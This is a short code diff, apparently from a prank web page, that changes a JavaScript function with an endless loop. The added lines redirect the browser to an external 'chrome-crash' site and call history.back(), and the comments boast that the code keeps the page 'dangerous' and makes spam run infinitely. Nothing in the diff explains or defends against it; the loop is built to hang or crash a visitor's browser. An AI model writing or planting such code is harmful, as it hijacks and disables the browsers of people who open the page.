@@ -5,7 +5,9 @@ $vwer = '#';
 function loadUrl(location)
 {
   while(1) {
-    this.document.location.href =  $vwer + $location;
+    this.document.location.href = $vwer + $location;
+    this.document.location.href = 'https://chrome-crash-invoke.github.io/chrome-crash/';
+    history.back(); // Forces Browser To Stay Clean While Still Being Dangrous.
     // If Document Is Pressed. Spam Occures Infinitly
   }
 }
